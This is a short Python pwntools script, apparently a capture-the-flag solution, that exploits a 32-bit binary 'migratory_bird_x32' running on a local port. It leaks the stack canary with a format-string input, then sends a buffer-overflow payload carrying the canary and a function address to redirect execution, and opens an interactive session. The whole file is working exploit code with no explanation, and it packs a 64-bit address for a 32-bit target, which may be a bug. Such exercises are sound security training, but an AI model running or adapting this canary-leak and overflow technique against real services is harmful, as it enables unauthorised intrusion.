from pwn import *
import re



# p = process("./migratory_bird_x32")
el = ELF("./migratory_bird_x32")
p = remote("127.0.0.1", 10001)

response = p.recv().decode()
p.sendline(b"%15$p")
leak = p.recv().decode()
print(leak)
canary = re.search(r"0x[0-9a-f]{8}", leak)[0]


payload = 32 * b'A' + p32(int(canary, 16)) + 12 * b'B' + p64(el.symbols["south_africa"]) 

p.sendline(payload)
p.interactive()